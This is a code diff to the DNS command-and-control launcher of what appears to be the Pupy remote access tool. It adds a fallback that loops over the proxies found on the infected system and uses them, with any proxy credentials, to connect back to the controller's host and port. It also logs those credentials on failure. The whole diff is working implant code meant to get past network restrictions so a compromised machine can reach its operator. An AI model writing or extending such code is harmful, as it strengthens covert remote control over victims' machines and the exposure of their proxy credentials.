@@ -4,6 +4,11 @@
 from ..base_launcher import *
 from ..picocmd import *
 
+from ..proxies import get_proxies
+from ..socks import GeneralProxyError, ProxyConnectionError
+from ..clients import PupyTCPClient, PupySSLClient
+from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
+
 from threading import Thread, Event, Lock
 
 import socket
@@ -185,3 +190,55 @@ class DNSCncLauncher(BaseLauncher):
 
                 if stream:
                     yield stream
+                    return
+
+                for proxy_type, proxy, proxy_username, proxy_password in get_proxies():
+                    _, host, port, transport = command
+                    t = network.conf.transports[transport](
+                        bind_payload=self.connect_on_bind_payload
+                    )
+
+                    if t.client is PupyTCPClient:
+                        t.client = PupyProxifiedTCPClient
+                    elif t.client is PupySSLClient:
+                        t.client = PupyProxifiedSSLClient
+                    else:
+                        return
+
+                    s = None
+                    stream = None
+
+                    proxy_addr, proxy_port = proxy.rsplit(':', 1)
+
+                    try:
+                        client = t.client(
+                            proxy_type=proxy_type.upper(),
+                            proxy_addr=proxy_addr,
+                            proxy_port=proxy_port,
+                            proxy_username=proxy_username,
+                            proxy_password=proxy_password
+                        )
+
+                        s = client.connect(host, port)
+                        stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
+
+                    except (socket.error, GeneralProxyError, ProxyConnectionError) as e:
+                        if proxy_username and proxy_password:
+                            proxy_auth = '{}:{}@'.format(proxy_username, proxy_password)
+                        else:
+                            proxy_auth = ''
+
+                        logging.error('Couldn\'t connect to {}:{} transport: {} '
+                                          'via {}://{}{}: {}'.format(
+                            host, port, transport,
+                            proxy_type, proxy_auth, proxy,
+                            e
+                        ))
+
+                    finally:
+                        with dnscnc.lock:
+                            dnscnc.stream = stream
+
+                    if stream:
+                        yield stream
+                        return
